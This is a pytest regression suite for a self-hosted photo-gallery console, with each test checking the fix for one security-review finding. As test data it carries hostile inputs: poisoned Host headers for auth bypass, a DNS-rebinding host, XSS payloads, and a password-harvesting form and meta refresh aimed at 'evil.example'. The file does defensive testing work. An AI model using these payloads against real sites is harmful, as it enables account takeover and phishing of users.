# SPDX-License-Identifier: AGPL-3.0-or-later
# Copyright © 2026 lucya.systems — https://lucya.systems
"""Regression tests for the findings of the November 2026 security review.

Each test reproduces one finding: it failed against the code as it was and
passes against the fix. The finding it covers is named in its docstring, so a
test that turns red again says which door has come open.
"""

import importlib.metadata
import re
from pathlib import Path

import pytest
from fastapi.testclient import TestClient
from PIL import Image

from aperture import albums, runtime, scanner
from aperture.console import security
from aperture.console.app import app as console_app
from aperture.runtime import settings

PASSWORD = "console-test-password"
REPO = Path(__file__).resolve().parent.parent


@pytest.fixture
def locked():
    security.set_password(PASSWORD)
    security.reset()
    yield TestClient(console_app)
    security.clear_password()
    security.reset()


@pytest.fixture
def open_console():
    security.clear_password()
    security.reset()
    yield TestClient(console_app)
    security.reset()


# ============================================================
# 1. auth bypass through a poisoned Host header
# ============================================================
# Starlette before 1.0.1 builds request.url from the Host header, and the
# guard asked request.url.path whether a route was open. `Host: x/login?`
# made every route look like the login page.
POISONED_HOSTS = ["x/login?", "x/static/?", "x/lucent/v1/#", "x/api/health?"]


@pytest.mark.parametrize("host", POISONED_HOSTS)
def test_a_poisoned_host_does_not_open_a_read(locked, host):
    """Finding 1 (read): /api/meta answered 200 without a session."""
    res = locked.get("/api/meta", headers={"host": host})
    assert res.status_code in (400, 401), res.text


@pytest.mark.parametrize("host", POISONED_HOSTS)
def test_a_poisoned_host_does_not_open_a_write(locked, host):
    """Finding 1 (write): a description was written without a session or a
    CSRF token."""
    target = settings.photos_dir / "tech" / ".album" / "album_jp.md"
    target.unlink(missing_ok=True)
    res = locked.put("/api/album/description", headers={"host": host},
                     json={"album": "tech", "lang": "jp", "text": "pwned"})
    assert res.status_code in (400, 401, 403), res.text
    assert not target.exists()


# ============================================================
# 2. DNS rebinding against a console without a password
# ============================================================
def test_an_open_console_refuses_a_rebound_hostname(open_console):
    """Finding 2: Origin was compared with a base URL built from the Host
    header, so a page on a rebound name passed as same-origin."""
    host = "rebind.attacker.example:8090"
    res = open_console.put("/api/album/description",
                           headers={"host": host, "origin": f"http://{host}"},
                           json={"album": "tech", "lang": "jp", "text": "x"})
    assert res.status_code in (400, 403), res.text
    assert open_console.get("/api/meta", headers={"host": host}).status_code in (400, 403)


@pytest.mark.parametrize("host", ["127.0.0.1:8090", "localhost:8090", "[::1]:8090",
                                  "10.0.0.5:8090"])
def test_an_open_console_still_answers_on_its_own_addresses(open_console, host):
    """The fix must not lock out loopback or an address typed as an IP --
    rebinding needs a name, an IP literal cannot be rebound."""
    assert open_console.get("/api/meta", headers={"host": host}).status_code == 200


def test_a_configured_hostname_is_let_through(open_console):
    with runtime.override(console_hosts=("aperture.lan",)):
        assert open_console.get("/api/meta",
                                headers={"host": "aperture.lan:8090"}).status_code == 200


def test_lucent_connector_routes_keep_their_own_door(open_console):
    """Lucent calls Aperture by its compose service name; those routes check
    the bearer token themselves and must not be refused by host."""
    res = open_console.get("/lucent/v1/manifest", headers={"host": "aperture:8090"})
    assert res.status_code == 404       # not paired -- but not refused by host


# ============================================================
# 3. Pillow decodes any format, whatever the extension says
# ============================================================
@pytest.mark.parametrize("fmt", ["TGA", "PCX", "ICO", "SGI"])
def test_a_photo_in_a_format_outside_the_allowlist_is_not_decoded(tmp_path, fmt):
    """Finding 3: a `.jpg` that is really another format went into that
    format's decoder -- each of them a separate attack surface."""
    src = tmp_path / "disguised.jpg"
    Image.new("RGB", (32, 32), (200, 10, 10)).save(src, fmt)
    assert not scanner.make_thumbnail(src, tmp_path / "out.webp", 16)


@pytest.mark.parametrize("fmt,ext", [("JPEG", ".jpg"), ("PNG", ".png"), ("WEBP", ".webp"),
                                     ("GIF", ".gif"), ("TIFF", ".tif"), ("BMP", ".bmp")])
def test_real_photo_formats_still_decode(tmp_path, fmt, ext):
    src = tmp_path / f"real{ext}"
    Image.new("RGB", (32, 32), (10, 200, 10)).save(src, fmt)
    assert scanner.make_thumbnail(src, tmp_path / "out.webp", 16)


# ============================================================
# 4. vulnerable dependency versions
# ============================================================
# The first version that carries the fixes named in the review.
MINIMUM = {
    "starlette": "1.3.1",          # CVE-2026-48710 (finding 1), CVE-2024-47874, ...
    "fastapi": "0.165.0",          # the first FastAPI that allows that Starlette
    "python-multipart": "0.0.31",  # CVE-2024-53981, CVE-2026-42561, CVE-2026-53539, ...
    "pillow": "13.0.0",            # CVE-2026-112403, CVE-2026-112398, CVE-2026-112900, ...
    "pillow-heif": "1.3.0",        # CVE-2026-28231
    "jinja2": "3.1.6",             # CVE-2025-27516, CVE-2024-56201, CVE-2024-56326
    "markdown": "3.8.1",           # CVE-2025-69534
}


def _v(text: str) -> tuple[int, ...]:
    return tuple(int(p) for p in re.findall(r"\d+", text)[:3])


def _pins() -> dict[str, str]:
    pins = {}
    for line in (REPO / "requirements.txt").read_text(encoding="utf-8").splitlines():
        m = re.match(r"\s*([A-Za-z0-9_.\-]+)(?:\[[^\]]*\])?==([\w.]+)", line)
        if m:
            pins[m.group(1).lower()] = m.group(2)
    return pins


@pytest.mark.parametrize("package,minimum", sorted(MINIMUM.items()))
def test_requirements_pin_a_fixed_version(package, minimum):
    """Findings 3, 4 and 7: the image is built from requirements.txt."""
    pins = _pins()
    if package == "starlette":       # pulled in by fastapi, pinned there
        pytest.skip("transitive: checked installed below")
    assert package in pins, f"{package} is not pinned"
    assert _v(pins[package]) >= _v(minimum), f"{package}=={pins[package]} < {minimum}"


@pytest.mark.parametrize("package,minimum", sorted(MINIMUM.items()))
def test_the_installed_version_is_a_fixed_one(package, minimum):
    installed = importlib.metadata.version(package)
    assert _v(installed) >= _v(minimum), f"{package} {installed} < {minimum}"


# ============================================================
# 5. raw HTML in album descriptions
# ============================================================
HOSTILE = {
    # escaped, the text may still SAY onerror -- what must not exist is a tag
    "raw tag": ("<img src=x onerror=alert(1)>", ["<img"]),
    "form": ('<form action="https://evil.example"><input name=pw></form>', ["<form", "<input"]),
    "script": ("<script>alert(1)</script>", ["<script"]),
    "javascript link": ("[click](javascript:alert(1))", ["javascript:"]),
    "data link": ("[click](data:text/html;base64,PHNjcmlwdD4=)", ["data:text"]),
    "attr_list handler": ("A paragraph\n{: onclick=\"alert(1)\" }", ["onclick"]),
    "meta refresh": ('<meta http-equiv="refresh" content="0;url=https://evil.example">', ["<meta"]),
}


@pytest.fixture
def description(indexed):
    path = settings.photos_dir / "tech" / ".album" / "album_en.md"
    path.parent.mkdir(parents=True, exist_ok=True)

    def write(text):
        path.write_text(text, encoding="utf-8")
        return albums.album_description("tech", "en") or ""
    yield write
    path.unlink(missing_ok=True)


@pytest.mark.parametrize("case", sorted(HOSTILE))
def test_a_description_cannot_carry_markup(description, case):
    """Finding 5: python-markdown passed raw HTML and `attr_list` attributes
    through, and the template prints it `| safe` (and /api hands it out with
    CORS *, where no CSP stands in front of it)."""
    source, forbidden = HOSTILE[case]
    html = description(source).lower()
    for needle in forbidden:
        assert needle not in html, (case, html)


def test_ordinary_markdown_still_renders(description):
    html = description("Three **days**, a [link](https://example.org) and a "
                       "[local one](/album/berlin).\n\n- one\n- two\n")
    assert "<strong>days</strong>" in html
    assert 'href="https://example.org"' in html
    assert 'href="/album/berlin"' in html
    assert "<li>one</li>" in html


def test_escaped_markup_is_shown_as_text(description):
    html = description("Use <b>bold</b> sparingly.")
    assert "&lt;b&gt;" in html


# ============================================================
# 7. the smaller ones
# ============================================================
def test_the_login_throttle_has_a_global_ceiling(locked):
    """Finding 7a: the throttle was per IP only, so an attacker rotating
    addresses got three free tries per address, forever."""
    for i in range(security.GLOBAL_MAX_FAILURES):
        security.note_failure(f"198.51.100.{i % 250}:{i}")
    res = locked.post("/api/session", json={"password": PASSWORD})
    assert res.status_code == 429


def test_the_failure_table_is_bounded():
    """Finding 7a: one entry per address, never pruned -- memory for anyone
    who can send requests from many addresses."""
    security.reset()
    try:
        for i in range(security.MAX_TRACKED_IPS + 500):
            security.note_failure(f"ip-{i}")
        assert len(security._failures) <= security.MAX_TRACKED_IPS
    finally:
        security.reset()


def test_a_password_needs_twelve_characters():
    """Finding 7a: eight characters was the floor."""
    with pytest.raises(ValueError):
        security.set_password("elevenchars")
    security.clear_password()


def test_a_forwarded_proto_from_an_untrusted_peer_is_ignored(locked):
    """Finding 7b: X-Forwarded-Proto was read straight from the request,
    past uvicorn's FORWARDED_ALLOW_IPS."""
    res = locked.post("/api/session", json={"password": PASSWORD},
                      headers={"x-forwarded-proto": "https"})
    assert res.status_code == 200
    assert "secure" not in res.headers["set-cookie"].lower()


def test_the_gallery_ignores_an_untrusted_forwarded_proto(client):
    res = client.get("/", headers={"x-forwarded-proto": "https"})
    assert "upgrade-insecure-requests" not in res.headers["content-security-policy"]


def test_a_non_ascii_csrf_header_is_a_refusal_not_a_crash(locked):
    """Finding 7c: secrets.compare_digest raises TypeError on non-ASCII str,
    which became a 500."""
    login = locked.post("/api/session", json={"password": PASSWORD})
    assert login.status_code == 200
    res = locked.put("/api/album/cfg", headers={"x-aperture-csrf": "ä".encode("utf-8")},
                     json={"album": "berlin", "values": {"name": "Berlin"}})
    assert res.status_code == 403


def test_every_action_is_pinned_to_a_commit():
    """Finding 7e: a tag can be moved; the workflow pushes to ghcr.io with
    packages: write."""
    for wf in (REPO / ".github" / "workflows").glob("*.yml"):
        for line in wf.read_text(encoding="utf-8").splitlines():
            m = re.search(r"uses:\s*([^\s#]+)", line)
            if m:
                assert re.fullmatch(r"[\w.\-]+/[\w.\-/]+@[0-9a-f]{40}", m.group(1)), \
                    f"{wf.name}: {m.group(1)} is not pinned to a commit"
